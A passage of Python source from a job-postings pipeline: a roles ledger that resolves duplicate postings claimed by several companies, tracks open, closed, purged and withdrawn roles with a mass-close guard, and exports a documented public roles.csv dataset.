                buckets.setdefault(("url", j["url"].strip()), []).append(i)
        for idxs in buckets.values():
            for x in range(len(idxs)):
                for y in range(x + 1, len(idxs)):
                    a_, b_ = jobs[idxs[x]], jobs[idxs[y]]
                    if a_.get("company") != b_.get("company") and same_posting(a_, b_):
                        parent[find(idxs[y])] = find(idxs[x])
        groups = {}
        for i in range(n):
            groups.setdefault(find(i), []).append(i)
        out = []
        for g in groups.values():
            if len({jobs[i].get("company") for i in g}) < 2:
                continue
            # `_titles_agree` is not transitive (its word-set is the longer job's location):
            # A~B and B~C with A≁C is three roles, not one. Only a clique collapses.
            if all(jobs[g[x]].get("company") == jobs[g[y]].get("company") or same_posting(jobs[g[x]], jobs[g[y]])
                   for x in range(len(g)) for y in range(x + 1, len(g))):
                out.append(g)
        return out

    @staticmethod
    def _winner(jobs, idxs, held):
        """Dedupe with stability, not an attribution judgement:
          1. the company whose own name is in the url / tenant slug (`names_in_url`) — the
             evidence outranks incumbency, or a pre-guard wrong name would be sticky forever
          2. else the company already holding the posting in the store (no flip-flop)
          3. else a native ATS row over a scrape over a discovery card (`_source_rank`)
          4. else not the "X Israel" site form, not a lowercase stub row ("kornit"), then the
             shortest identity (the parent), then A-Z"""
        from .firmographics import identity_key

        def rank(i):
            j = jobs[i]
            name = str(j.get("company") or "")
            return (0 if names_in_url(name, j.get("url")) else 1,
                    0 if _store.merge_key(j) in held else 1,
                    _source_rank(j),
                    1 if re.search(r"\bisrael\b", name.lower()) else 0,
                    1 if name == name.lower() else 0,
                    len(identity_key(name)),
                    name)
        return min(idxs, key=rank)

    def _supersede(self, loser_key, winner_key):
        if loser_key == winner_key:           # "Acme Ltd" and "Acme" share one mkey
            return
        self.st.supersede(loser_key, winner_key)
        rec = self.records.get(loser_key)
        if rec is not None and rec.get("status") != "superseded":
            rec["status"], rec["superseded_by"] = "superseded", winner_key
            self._touch(rec)

    def resolve_claims(self, merged, failed=(), scanned=None):
        return self._guard("resolve_claims", lambda: self._resolve_claims(merged, failed, scanned),
                           (merged, []))

    def _resolve_claims(self, merged, failed=(), scanned=None):
        self.claims = []                      # this call's, not the instance's history
        """This run's postings: a group under >=2 company names keeps ONE (`_winner`).
        Losers' seen_ids and sources are unioned into the winner (filter_new keeps seeing
        them sent), losers are named on the winner and in the mail, and loser rows already
        in the store become `superseded`. A superseded row fetched again while its winner
        is neither fetched nor in fetch-failure grace RECLAIMS itself (the winner's registry
        row was parked — the opening must not vanish from every product); `scanned` is the
        set of company names this run looked at — a scoped `--only` run must not reclaim for
        a winner that was merely out of scope. Returns (kept, lines)."""
        rows = self.st.get_matched_since("0000-01-01", include_superseded=True)
        held = {r["mkey"] for r in rows if r.get("status") != "superseded"}
        sup = {r["mkey"]: r for r in rows if r.get("status") == "superseded"}
        by_key = {r["mkey"]: r for r in rows}
        keys_today = {_store.merge_key(j) for j in merged}
        reclaimed = 0
        for j in merged:
            k = _store.merge_key(j)
            if k not in sup:
                continue
            w = sup[k].get("superseded_by") or ""
            winner = by_key.get(w)
            wc = (winner or {}).get("company")
            if w in keys_today or (wc and wc in set(failed)):
                continue
            if scanned is not None and wc and wc not in scanned:
                continue                      # out of scope today, not parked
            self.st.update_matched(k, status=None, superseded_by=None)
            rec = self.records.get(k)
            if rec is not None:
                rec["status"], rec["superseded_by"] = "open", ""
                self._touch(rec)
            held.add(k)
            reclaimed += 1
        self.reclaimed = reclaimed
        drop = set()
        rows = {r["mkey"]: r for r in
                self.st.get_matched_since("0000-01-01", include_superseded=True)}
        for idxs in self._groups(merged):
            win = self._winner(merged, idxs, held)
            w = merged[win]
            sids = set(w.get("seen_ids") or [_store.seen_id(w)])
            srcs = set(w.get("sources") or [w.get("ats_platform") or ""])
            losers = []
            for i in idxs:
                if i == win:
                    continue
                lo = merged[i]
                sids |= set(lo.get("seen_ids") or [_store.seen_id(lo)])
                # ...and the loser's STORED ids, not only the ones this run happened to
                # fetch. `resolve_claims` runs BEFORE `upsert_matched`, so the winner's row
                # is built from this union alone — and on any run where the key changed
                # shape, the id the posting was actually EMAILED under sits only on the
                # loser's stored row. Without this line `filter_new` calls a delivered
                # posting new and mails it a second time under the winner's name, which is
                # exactly what the docstring above already promises does not happen.
                lk = _store.merge_key(lo)
                sids |= {x for x in ((rows.get(lk) or {}).get("seen_ids") or []) if x}
                srcs |= set(lo.get("sources") or [lo.get("ats_platform") or ""])
                losers.append(lo.get("company"))
                if lk in held or lk in self.records:
                    self._supersede(lk, _store.merge_key(w))
                drop.add(i)
            w["seen_ids"] = sorted(sids - {""})
            w["sources"] = sorted(srcs - {""})
            w["_claimed_by"] = sorted(set(losers) | set(w.get("_claimed_by") or []))
            self.claims.append(f"{w.get('company')}<-{'/'.join(sorted(set(losers)))}")
        kept = [j for i, j in enumerate(merged) if i not in drop]
        lines = [f"claim conflicts {len(self.claims)} ({', '.join(self.claims)})"] if self.claims else []
        if reclaimed:
            lines.append(f"{reclaimed} reclaimed (superseded, winner no longer fetched)")
        return kept, lines

    def sweep_store(self):
        """The same rule over what the store ALREADY holds: a double whose other half is
        no longer fetched (its registry row was parked) would otherwise stay on the board
        or in the archive forever. Returns the number superseded this sweep."""
        recs = [r for r in self.records.values()
                if r.get("status") not in ("superseded", "purged", "withdrawn")]
        open_keys = {r["role_id"] for r in recs if (r.get("status") or "open") == "open"}
        n = 0
        for idxs in self._groups(recs):
            win = self._winner(recs, idxs, open_keys)
            for i in idxs:
                if i != win:
                    self._supersede(recs[i]["role_id"], recs[win]["role_id"])
                    n += 1
        return n

    # ---- close --------------------------------------------------------------------
    def closed_keys(self):
        """Role ids the ledger records as closed — `store.upsert_matched`'s reopening test.

        The ledger is the right instrument for "was this role absent?" because it closes a
        role ONLY where the run actually looked: never on a failed board, never at a company
        a scoped run did not scan. A calendar gap cannot tell "we looked and it was gone"
        from "there was no run", and so fires on an outage (BACKLOG 139).

        A frozen or corrupt ledger returns None, and `upsert_matched` then keeps the old
        calendar rule rather than treating every role as never-closed."""
        if self.frozen:
            return None
        return {rid for rid, rec in self.records.items() if rec.get("status") == "closed"}

    def id_collisions(self, merged):
        """seen_ids that name more than one role in THIS run — an alarm, never a repair.

        Format-independent on purpose, so it survives every future change to the key: it
        needs no idea of what a tenant is, and it catches the two shapes that are otherwise
        invisible to each other — a cross-TENANT collision (`bamboohr:39` under Bringoz and
        under Miggo Security) and a same-tenant one (`workday:Regular Employee` under
        sixteen Thales roles). An audit that counts only cross-company collisions sees the
        first and walks past the second; this sees both.

        Postings that share an address are NOT a collision: that is one posting fetched by
        two registry rows, which `resolve_claims` exists to collapse. Two roles that share a
        key and share NO address are the worst case, not an exempt one — an earlier version
        of this predicate required two distinct urls and therefore said nothing about it.

        Its reach is one run: `merged` holds only the roles this run accepted, so a board
        whose four postings share a key contributes ONE row and nothing here can see it.
        That case is `python -m pipeline.store --audit-ids`, which reads whole boards, and
        BACKLOG 311, which fixes its cause."""
        by_id = {}
        for j in merged:
            for sid in (j.get("seen_ids") or [_store.seen_id(j)]):
                by_id.setdefault(sid, set()).add(
                    (_store.merge_key(j), str(j.get("url") or "").strip()))
        hits = {sid: v for sid, v in by_id.items()
                if len({k for k, _ in v}) > 1 and len({u for _, u in v if u}) != 1}
        if hits:
            worst = max(hits.items(), key=lambda kv: len(kv[1]))
            self.alarms.append(
                f"roles seen-id collision ({len(hits)} id(s) name two or more roles; "
                f"worst: {worst[0][:60]} x{len(worst[1])}) — one of them will never be emailed")
        return hits

    def record_run(self, run_date, *, board_jobs, merged, scanned_ok, failed, paths=None,
                   scoped=True, never_ours=()):
        """Status / episodes / reposts / class / tags / attribution for this run, then flush.
        Closure is judged for companies this run looked at and whose fetch succeeded — every
        company but the failed ones on a FULL run (a role whose employer is no registry row
        at all cannot be fetched and is dead by `_alive`), only the scanned ones on a scoped
        run. `board_jobs` must be the ALIVE set, before any page-weight cap. A mass-close is
        an alarm, never a closure. Never touches `matched` — `_alive` in run.py stays the
        liveness rule. Returns mail lines.

        `never_ours` is the set of company names whose registry row points at an AGGREGATOR
        (run.py computes it already, to keep such a row from being scanned at all). Their
        records are `purged`, not closed: `Tel Aviv` is a CITY that was activated on
        jobs.secrettelaviv.com, and its seven records are seven other employers' postings.
        `closed` would file them in the public archive as expired or filled, under the name
        of a city, permanently — section 7c reserves `purged` for a row that was never ours,
        and this is that case. A purge is not a closure and never counts toward the
        mass-close guard, because parking a row is a deliberate registry action and not the
        broken fetch that guard exists to catch."""
        return self._guard("record_run", lambda: self._record_run(
            run_date, board_jobs=board_jobs, merged=merged, scanned_ok=scanned_ok, failed=failed,
            paths=paths, scoped=scoped, never_ours=never_ours), ["roles: not recorded (see Stages)"])

    def _record_run(self, run_date, *, board_jobs, merged, scanned_ok, failed, paths, scoped,
                    never_ours=()):
        rows = {r["mkey"]: r for r in self.st.get_matched_since("0000-01-01", include_superseded=True)}
        onboard = {_store.merge_key(j) for j in board_jobs}
        by_key = {_store.merge_key(j): j for j in merged}
        failed = set(failed or ())
        judged = (lambda c: c in scanned_ok and c not in failed) if scoped else (lambda c: c not in failed)
        # `never_ours` arrives already reduced to identities by `run.py`, which uses the
        # SAME set for `_alive`. It used to be normalised here and matched raw there, and
        # that is a live hazard rather than a safeguard: normalising can only ADD names, and
        # the names it adds are the ACTIVE twins of a parked row (the registry holds eleven —
        # Nice/NICE, SolarEdge, Nova, Innoviz, HP, Workday, Orca AI, Akamai, Tevel, Dell,
        # TechBiz Global). A role under a live company must never be purged because a parked
        # row strips to the same identity.
        # A dict {identity: reason} since 2026-08-30 — there are two sources of "never an
        # employer" now (the registry's aggregator rows, and intake's `agency` verdicts) and
        # the record must say WHICH. A bare set still works and means the registry reason.
        if isinstance(never_ours, dict):
            _reason_for = dict(never_ours)
        else:
            _reason_for = {i: PURGE_REASON for i in (never_ours or ())}
        _norm_never_ours = set(_reason_for)
        sent = self.st.load_sent()
        withdrawn_lines, purged_lines, lifted = [], [], []
        c = Counter()
        # BEFORE the frozen early-return below. The run log records that the pipeline LOOKED,
        # which is true whether or not the ledger could be read — and `upsert_matched` uses
        # it to tell "absent across four real runs" from "there were no runs". Stamping it
        # after the return meant a ledger freeze silently froze the log too, so a role that
        # vanished during the freeze and came back kept a stale `first_seen` and fell out of
        # `get_matched_since(cutoff_email)` for ever. Only a FULL run stamps: a scoped
        # `--only` run gave no chance to any company it did not scan, and the log's whole
        # meaning is "chances this role had to be seen".
        if not scoped:
            try:
                self.st.record_run_date(run_date)
            except Exception:                 # never let the log take the digest down
                pass
        if self.frozen:
            open_n = sum(1 for k, r in rows.items() if k in onboard)
            line = (f"open {open_n} · ledger frozen (corrupt) · store {len(rows)}")
            return [line] + ([f"merged-copy {paths['merged-copy']}"] if paths and paths.get("merged-copy") else [])
        # absorb this run's sqlite state first, then judge
        for rid, row in rows.items():
            rec = self.records.get(rid)
            if rec is None:
                rec = {"role_id": rid, "episodes": [], "reposts": [], "sent": {}}
                self.records[rid] = rec
                c["absorbed"] += 1
            prev_status = rec.get("status") or "open"
            self._absorb(rec, reconcile(row, {**rec, "description": rec.get("description") or ""}))
            # The title-derived seniority, for every record the classifier did not judge THIS
            # run — the 63 closed and the 52 not re-fetched would otherwise keep the empty
            # string forever, and `roles.csv` would ship a column that is populated only for
            # the roles that happened to be live this morning. `_seniority` is a pure keyword
            # function over the title (pipeline/seniority.py): no description, no call, no
            # spend, and it is the SAME function whose answer `classify` puts on the job.
            if not (rec.get("seniority") or "") and rec.get("title"):
                if backfill_seniority({rid: rec}):
                    self._touch(rec)
            if row.get("status") == "superseded":
                if rec.get("status") != "superseded":
                    rec["status"], rec["superseded_by"] = "superseded", row.get("superseded_by") or ""
                    self._touch(rec)
                for e in self.retractions.match_all(rec):
                    e["_hits"].append(rid)       # a double is already off every product: the
                continue                         # line is answered, never "unmatched"
            # episodes: the sqlite first_seen resets on a >3-day gap; history is kept here
            eps = rec.setdefault("episodes", [])
            if not eps or eps[-1].get("first_seen") != rec["first_seen"]:
                if eps and prev_status != "open":
                    c["reopened"] += 1
                eps.append({"first_seen": rec["first_seen"], "last_seen": rec["last_seen"],
                            "posted_date": rec["posted_date"]})
                self._touch(rec)
            elif eps[-1].get("last_seen") != rec["last_seen"] or eps[-1].get("posted_date") != rec["posted_date"]:
                eps[-1]["last_seen"], eps[-1]["posted_date"] = rec["last_seen"], rec["posted_date"]
                self._touch(rec)
            # repost: posted_date bumped >= REPOST_DAYS past this episode's first_seen
            pd, fs = rec["posted_date"], eps[-1]["first_seen"]
            if _iso(pd) and _iso(fs) and (dt.date.fromisoformat(pd) - dt.date.fromisoformat(fs)).days >= REPOST_DAYS:
                if pd not in rec.setdefault("reposts", []):
                    rec["reposts"].append(pd)
                    c["reposted"] += 1
                    self._touch(rec)
            # what the classifier said, and who else claimed the posting
            j = by_key.get(rid)
            if j is not None:
                cls = j.get("_class") or {}
                new_cls = {k: cls.get(k) for k in ("decision", "path", "reason") if cls.get(k) is not None}
                if new_cls and rec.get("class") != new_cls:
                    rec["class"] = new_cls
                    self._touch(rec)
                att = rec.get("attribution") or {}
                claimed = sorted(set(att.get("claimed_by") or []) | set(j.get("_claimed_by") or []))
                new_att = {"platform": (rec.get("sources") or [""])[0],
                           "host": urlparse(rec.get("url") or "").netloc,
                           "slug": tenant_slug(rec.get("url")), "claimed_by": claimed}
                if att != new_att:
                    rec["attribution"] = new_att
                    self._touch(rec)
            # tags: render owns the vocabulary, this lane owns the column
            if (rec.get("tags") or {}).get("v") != TAGS_V or rec.get("tags_sha1") != rec["desc_sha1"]:
                rec["tags"] = self._tags(rec["title"], rec.get("description") or "")
                rec["tags_sha1"] = rec["desc_sha1"]
                self._touch(rec)
            # sent mirror -> emailed_on
            mine = {sid: sent[sid] for sid in rec.get("seen_ids") or [] if sid in sent}
            if mine and mine != rec.get("sent"):
                rec["sent"] = mine
                rec["emailed_on"] = min(mine.values())
                self._touch(rec)
            # status. A record absorbed for the first time this run has no history: it is
            # classified, not closed, and never counts toward the mass-close guard.
            fresh = rec.pop("_fresh", False)
            hits = self.retractions.match_all(rec)
            ret = hits[0] if hits else None
            ident = _store._norm_company(rec.get("company"))
            if ret is not None:
                # A human said so, in `roles_retractions.jsonl`. Applied before every
                # predicate below because the predicates are exactly what this posting
                # passed. The status is the line's (`withdrawn` or `purged`), the reason
                # is published, and `retracted_on` is the line's date — not today's, so a
                # re-derived file does not move the day the row left. Lifting a retraction
                # is deleting the line: the record is then judged like any other next run.
                for e in hits:                        # two lines for one row: both answered
                    e["_hits"].append(rid)
                want, reason = ret["status"], ret["reason"].strip()
                field = "withdraw_reason" if want == "withdrawn" else "purge_reason"
                other = "purge_reason" if want == "withdrawn" else "withdraw_reason"
                if (rec.get("status") != want or rec.get(field) != reason
                        or rec.get("retracted_on") != ret["on"] or rec.get(other)):
                    rec["status"], rec[field], rec["retracted_on"] = want, reason, ret["on"]
                    rec.pop(other, None)              # a flipped line never keeps a stale reason
                    rec["closed_on"] = rec.get("closed_on") or ret["on"]
                    self._touch(rec)
                    c[want] += 1                      # a delta, like `closed today`
                    withdrawn_lines.append(f"{rec.get('company')} | {rec.get('title')} — {reason}")
                c[want + "_total"] += 1
            elif rec.get("retracted_on") and prev_status in RETRACTABLE and not (
                    _norm_never_ours and ident in _norm_never_ours):
                # A record that WAS retracted and no line names any more: the human lifted
                # it, or the file was lost (it rides the same wholesale-restore path as the
                # ledger). Either way it is loud — the record returns to the ordinary ladder
                # below on this run, and the retraction stamps come off so the meta stops
                # advertising a withdrawal nobody stands behind.
                lifted.append(f"{rec.get('company')} | {rec.get('title')}")
                for k in ("retracted_on", "withdraw_reason", "purge_reason"):
                    rec.pop(k, None)
                rec["status"] = "open" if rid in onboard else "closed"
                rec["closed_on"] = None if rid in onboard else (rec.get("closed_on") or run_date)
                self._touch(rec)
                c["open" if rid in onboard else "closed"] += 1
            elif _norm_never_ours and ident in _norm_never_ours:
                if rec.get("status") != "purged":
                    rec["status"] = "purged"
                    rec["closed_on"] = rec.get("closed_on") or run_date   # keep a real closure date
                    rec["purged_on"] = run_date       # the day it left the PUBLIC file — not the
                    self._touch(rec)                  # day the board dropped it
                    purged_lines.append(f"{rec.get('company')} ({_reason_for[ident][:40]}…)")
                # WHY this row left the product, on the row itself. `purged` is the one
                # status that removes a record from every product INCLUDING the archive, and
                # it was indistinguishable from `closed` except by reading the registry as it
                # stood that morning — which is not recoverable later. The dataset counts
                # purges in its meta file, and a count with no reason is the kind of
                # confident number this repo punishes.
                #
                # Stamped OUTSIDE the status change, deliberately: the seven records purged
                # on 2026-08-27 are already `purged`, so a stamp on the transition alone
                # would leave them reasonless for ever. This is not a backfill of something
                # inferred — reaching this branch means the row is in `never_ours` TODAY, so
                # the reason is re-observed on the run that writes it.
                if rec.get("purge_reason") != _reason_for[ident]:
                    rec["purge_reason"] = _reason_for[ident]
                    self._touch(rec)
                    c["purged"] += 1      # a delta, like `closed today` beside it — not a
                c["purged_total"] += 1    # running total that never decays
            elif rid in onboard:
                if prev_status != "open":
                    rec["status"], rec["closed_on"] = "open", None
                    self._touch(rec)
                c["open"] += 1
            elif judged(rec.get("company")):
                if fresh:
                    rec["status"], rec["closed_on"] = "closed", rec.get("last_seen") or run_date
                    self._touch(rec)
                    c["closed"] += 1
                    c["fresh_closed"] += 1
                elif prev_status == "open":
                    c["to_close"] += 1
                    rec["_close"] = True
                elif prev_status == "closed":
                    c["closed"] += 1
            elif prev_status in RETRACTABLE:
                c[prev_status + "_total"] += 1     # a standing verdict is a total, never a delta
            else:
                c[prev_status] += 1
        # mass-close guard: statuses are held, the mail is told
        open_before = c["open"] + c["to_close"]
        if c["to_close"] > max(MASS_CLOSE_MIN, MASS_CLOSE_FRAC * open_before):
            self.alarms.append(f"roles mass-close held ({c['to_close']} of {open_before} open "
                               f"roles vanished in one run) — a broken fetch, not a measurement")
            for rec in self.records.values():
                rec.pop("_close", None)
            c["open"] += c["to_close"]
        else:
            for rec in self.records.values():
                if rec.pop("_close", None):
                    rec["status"], rec["closed_on"] = "closed", run_date
                    c["closed_today"] += 1
                    c["closed"] += 1
                    self._touch(rec)
        # The alarm that makes a withdrawal visible where a human reads daily: the day a
        # retraction is first applied, `Stages:` names the row and the reason. A line that
        # matched nothing is ALSO an alarm — a typo in the file must not read as "applied".
        if withdrawn_lines:
            self.alarms.append(f"roles withdrawn {len(withdrawn_lines)} role(s) from every "
                               f"product and the public dataset: " + "; ".join(withdrawn_lines)[:400])
        if purged_lines:
            # the automatic verdict is the quiet one, so it is named too — a predicate that
            # starts catching real employers must be visible the morning it does
            self.alarms.append(f"roles purged {len(purged_lines)} role(s) by predicate this run: "
                               + "; ".join(purged_lines)[:400])
        if lifted:
            self.alarms.append(f"roles retraction lifted for {len(lifted)} role(s) — no line in "
                               f"{RETRACTIONS} names them any more, they return to the ordinary "
                               f"ladder (deliberate, or the file was lost): " + "; ".join(lifted)[:300])
        for key in self.retractions.unmatched():
            self.alarms.append(f"roles retraction unmatched ({key}) — no record answers to it; "
                               f"check the line in {RETRACTIONS}")
        if self.dirty or self.text_dirty:
            self.flush(run_date)
        self.counts = dict(c)           # the funnel reads what the mail line reads
        ledger_n, store_n = len(self.records), len(rows)
        if ledger_n != store_n:
            self.alarms.append(f"roles ledger {ledger_n} != store {store_n} after sync")
        line = (f"open {c['open']} · closed today {c['closed_today']} · reopened {c['reopened']}"
                f" · reposted {c['reposted']}"
                + (f" · purged {c['purged']}" if c["purged"] else "")
                + (f" · withdrawn {c['withdrawn']}" if c["withdrawn"] else "")
                + (f" · merged-copy {paths['merged-copy']}" if paths and paths.get("merged-copy") else "")
                + (f" · absorbed {self.report.get('absorbed')} ({c['fresh_closed']} already closed)"
                   if self.report.get("absorbed") else "")
                + f" · ledger {ledger_n} {'=' if ledger_n == store_n else '!='} store {store_n}")
        if self.report.get("rehydrated"):
            line += f" · rehydrated {self.report['rehydrated']}"
        return [line]

    @staticmethod
    def _tags(title, desc):
        from . import roleprofile
        p = roleprofile.extract(title, desc)
        return {"v": TAGS_V, "skills": [list(s) for s in p.get("skills") or []],
                "family": p.get("family"), "track": p.get("track"), "years": p.get("years"),
                "degree": p.get("degree"), "ai": list(p.get("ai") or [])}

    # ---- the public dataset -------------------------------------------------------
    def export_dataset(self, run_date, firmographics=None, window_days=WINDOW_DAYS):
        """Write `roles.csv` + its meta file beside the ledger. Returns mail lines.

        Deliberately NOT wrapped in `self._guard`: that seam FREEZES the ledger, which is
        the right answer for a seam that reads or writes the record and the wrong one here.
        The dataset is derived — if it cannot be written, the record is still perfect and
        tomorrow rebuilds the file whole. An export bug must never cost a day of the thing
        it is derived from."""
        try:
            if self.frozen:
                return ["roles dataset not written (ledger frozen — sqlite carried the day)"]
            earliest_run = ""
            try:
                earliest_run = self.st.conn.execute(
                    "SELECT MIN(run_date) FROM runs").fetchone()[0] or ""
            except Exception:  # noqa: BLE001 — the log is a nicety here, never a blocker
                pass
            rows, archived, counts, _meta = export_files(
                self.records, self.st.path, run_date=run_date, firmographics=firmographics,
                window_days=window_days, earliest_run=earliest_run)
            ex = (f"superseded {counts.get('superseded', 0)} · purged {counts.get('purged', 0)}"
                  f" · withdrawn {counts.get('withdrawn', 0)}"
                  f" · outside window {counts.get('outside_window', 0)}")
            return [f"dataset {len(rows)} roles ({counts['window_start']}..{counts['window_end']})"
                    f" · archived {len(archived)} · excluded {ex}"
                    f" · firmo {counts.get('firmo:none', 0)} of {len(rows)} unmatched"]
        except Exception as e:  # noqa: BLE001
            self.alarms.append(f"roles dataset export failed: {e.__class__.__name__}: "
                               f"{str(e)[:80]} — roles.csv keeps yesterday's rows")
            return ["roles dataset NOT written (see Stages)"]

    def _dataset_alarm(self):
        """Did the LAST run regenerate the dataset? An artefact nobody re-derives is one
        nobody notices going stale — the whole reason this lane exists twice over.

        Compares the meta file's `run_date` against the newest date in the run log, both of
        which predate this run (`record_run_date` stamps later). A scratch store has an
        empty log and is silent, which is what a local experiment should be."""
        try:
            last = self.st.conn.execute("SELECT MAX(run_date) FROM runs").fetchone()[0] or ""
        except Exception:  # noqa: BLE001
            return
        if not last or not self.records:
            return
        _c, meta_path, _f = dataset_paths(self.st.path)
        try:
            with open(meta_path, encoding="utf-8") as f:
                stamped = str(json.load(f).get("run_date") or "")
        except FileNotFoundError:
            self.alarms.append(f"roles dataset missing ({DATASET_META} absent while the run "
                               f"log reaches {last}) — nothing is publishing roles.csv")
            return
        except Exception:  # noqa: BLE001 — unreadable is as bad as absent, and as loud
            self.alarms.append(f"roles dataset meta unreadable ({DATASET_META}) — "
                               f"roles.csv cannot be trusted to describe itself")
            return
        if stamped < last:
            self.alarms.append(f"roles dataset stale (roles.csv stamped {stamped}, last run "
                               f"{last}) — a run completed without regenerating it")

    # ---- flush --------------------------------------------------------------------
    def flush(self, run_date=None):
        """Write both files atomically; a failure is an alarm, never an exception — the
        sqlite side still commits, so the day is not lost to the ledger."""
        if self.frozen:
            return False
        try:
            if self.dirty:
                stamp = run_date or self.run_date
                out = {}
                for rid, rec in self.records.items():
                    if rec.pop("_touched", False):
                        rec["updated"] = stamp
                    out[rid] = {k: v for k, v in rec.items()
                                if k != "description" and not k.startswith("_")}
                dump(self.path, out)
                self.dirty = False
            if self.text_dirty and not self.text_frozen:
                # the prune is deliberate — a description whose role no longer exists is
                # not history, it is an orphan — so those keys are declared droppable and
                # everything else still trips the guard
                pruned = {k for k in self.text if k not in self.records}
                self.text = {k: v for k, v in self.text.items() if k in self.records}
                dump(self.text_path, self.text, may_drop=pruned)
                self.text_dirty = False
            return True
        except LedgerShrink as e:
            # Louder than a write failure and differently caused: the bytes are fine, the
            # RECORD SET is short. Yesterday's file stands and the day is still delivered.
            # It must say WHICH file: `flush` writes the record file first and clears
            # `dirty`, so a refusal on the text dump used to report "nothing was recorded"
            # about a run whose records had already landed in that same call.
            landed = ("the record file had already been written this run"
                      if not self.dirty else "nothing was recorded either")
            self.alarms.append(f"roles ledger SHRINK refused ({e}) — that file on disk was "
                               f"kept and nothing was deleted; {landed}")
            return False
        except Exception as e:  # noqa: BLE001
            self.alarms.append(f"roles ledger write failed: {e.__class__.__name__}: {str(e)[:80]}")
            return False


# --------------------------------------------------------------------------- #
# the public dataset — one row per role (ARCHITECTURE.md 7c)
# --------------------------------------------------------------------------- #
# WHY A SECOND FILE AT ALL. `roles.jsonl` is the record and it is public already, but it is
# a nested JSON-lines file with a skills list of pairs inside a tags object: nobody opens
# that in a spreadsheet and no analysis groups by skill without writing a parser first. The
# CSV is the same data, flattened, with every list on one documented separator.
#
# WHAT IT IS NOT: it is not a second store. It is derived, every morning, from the ledger
# and the firmographics export, and if it is deleted the next run rebuilds it whole.
_CATS = ("bi", "query", "de", "pa", "prog", "method", "cloud", "lang")

# (name, doc) — the doc reaches the reader through the meta file, so it is written for
# somebody who has never seen this repo.
_COLUMNS = [
    ("role_id", "Opaque stable id for the role — a normalised slug derived from company and title (punctuation and corporate suffixes dropped), so DO NOT split it: use the company and title columns. It is the join key for roles_text.jsonl."),
    ("company", "Employer name as it appears on the board we read."),
    ("title", "Job title as posted."),
    ("location", "Location as posted (free text, usually an Israeli city)."),
    ("url", "The posting's own address on the employer's careers board."),
    ("status", "open = still on the employer's board at last_seen; closed = it was gone when we last looked."),
    ("posted_date", "The date the EMPLOYER states the role was posted. Empty when the board publishes none."),
    ("first_seen", "The first day this pipeline ever saw the role, across all of its spells. Not a posting date."),
    ("last_seen", "The last day this pipeline saw the role on its board. The window column."),
    ("date_estimate", "Best available 'when did this role appear': posted_date if there is one, else first_seen."),
    ("date_basis", "Which date date_estimate came from, and how much to trust it."),
    ("days_observed", "Days from the FIRST day we ever saw this role (across all its spells) to the last, inclusive. Days we observed it, not days it was open — we only see it when a scan runs."),
    ("closed_on", "The day we recorded it closed. Empty while open."),
    ("emailed", "true if this role went out in a daily digest email."),
    ("emailed_on", "The date it was first emailed. Empty if never emailed."),
    ("episodes", "How many separate spells we have seen this role open (a reappearance after an absence starts a new one)."),
    ("reposts", "How many times the employer bumped posted_date 3+ days past the start of the current spell."),
    ("repost_dates", "The posted_date values those bumps landed on, separated by ';'."),
    ("sources", "Which fetchers saw it (greenhouse, comeet, scrape, ...), separated by ';'."),
    ("host", "The hostname of url — the ATS or careers domain the posting lives on."),
    ("seniority_title", "Seniority read from the TITLE ALONE by keyword. Not the years figure."),
    ("years_experience", "Years of experience asked for, read from the DESCRIPTION text. Empty when the text does not say."),
    ("family", "Role family, from title first and the opening of the description second."),
    ("track", "IC = individual contributor, Lead = the title names a lead/manager/head."),
    ("degree_level", "Highest degree the posting requires or prefers."),
    ("degree_status", "Whether that degree is required or merely preferred."),
    ("degree_fields", "Fields of study named alongside it, separated by ';'."),
    ("ai", "How the posting expects AI to be used, separated by ';'. Empty when AI is not mentioned."),
    ("skills", "Every skill found in title+description, separated by ';', in extraction order."),
    ("class_decision", "The classifier's verdict on the role when it was last judged."),
    ("class_path", "How that verdict was reached: keyword, llm, llm_cache, ..."),
    ("description_len", "Characters of description text we hold. 0 when we captured none."),
    ("description_truncated", "true when the text sits exactly on the 6,000-character capture cap, i.e. the real posting is longer."),
    ("description_sha1", "sha1 of the description text; join to roles_text.jsonl to read it."),
    ("sector", "Company sector (firmographics)."),
    ("sub_sector", "Narrower niche (firmographics, free text)."),
    ("stage", "Company stage (firmographics)."),
    ("stage_note", "Ticker or acquisition note behind that stage."),
    ("size_band", "Headcount band (firmographics)."),
    ("employees_global", "Global headcount, all sites (firmographics)."),
    ("founded", "Year founded (firmographics)."),
    ("business_model", "How the company earns money (firmographics, free text)."),
    ("customer_type", "Who buys from it (firmographics, free text)."),
    ("il_center", "Its main Israeli site(s) (firmographics)."),
    ("firmo_as_of", "The date those company facts were researched."),
    ("firmo_match", "How the company facts were matched to this row."),
] + [(f"skills_{c}", f"Skills of category '{c}' only, separated by ';' — group by this without parsing.")
     for c in _CATS]

COLUMNS = [c for c, _doc in _COLUMNS]

# Columns whose cell is a SEP-joined LIST rather than one value. It matters to a reader
# holding the meta file: an `enum` on one of these constrains each separated token, not the
# cell, and a checker that compares the whole cell against the enum reports every multi-value
# row as undocumented. (I wrote exactly that checker while validating the published file and
# briefly believed the data was wrong.)
LIST_COLUMNS = ["sources", "repost_dates", "degree_fields", "ai", "skills"] + [
    "skills_" + c for c in _CATS]

_ENUMS = {
    "status": {
        "open": "still listed on the employer's own careers board when we last looked",
        "closed": "we looked at that board again and the posting was gone",
    },
    "date_basis": {
        "posted_date": "the employer published a date and we use it",
        "first_seen": "no published date; the day WE first saw it, which is an upper bound "
                      "on how old the posting is",
        "first_seen_oldest_for_company": "no published date, AND this is the oldest sighting "
                                         "we hold for this employer — so it may have arrived "
                                         "as part of a back catalogue when we started "
                                         "watching, rather than having been posted that day. "
                                         "Treat the date as 'not newer than this' only.",
    },
    "seniority_title": {
        "senior": "the title says senior/lead/principal/staff (or the Hebrew equivalent)",
        "junior": "the title says junior/entry-level and does not also say senior",
        "unknown": "the title carries no seniority word — most titles",
    },
    "track": {"IC": "individual contributor", "Lead": "the title names a lead, manager or head"},
    "degree_status": {"required": "stated as a requirement", "preferred": "stated as an advantage"},
    "firmo_match": {
        "exact": "company facts matched this row's company name exactly",
        "identity": "matched after normalising the name (suffixes, aliases, 'X Israel')",
        "none": "we hold no researched facts for this company; every firmographics column is empty",
    },
    "class_decision": {"accept": "judged an analytics role in Israel", "reject": "judged not one"},
}


def _closed_vocabularies():
    """The enums whose values live in another module, read from that module rather than
    retyped here so the meta cannot drift from what `build_rows` actually emits.

    An adversarial pass on 2026-08-30 found six closed vocabularies shipping with no `enum`
    in the meta — `family` (8 values), `stage`, `size_band`, `degree_level`, `degree_fields`
    and `ai` — while `track` (2 values) and `degree_status` (2) were documented, so the
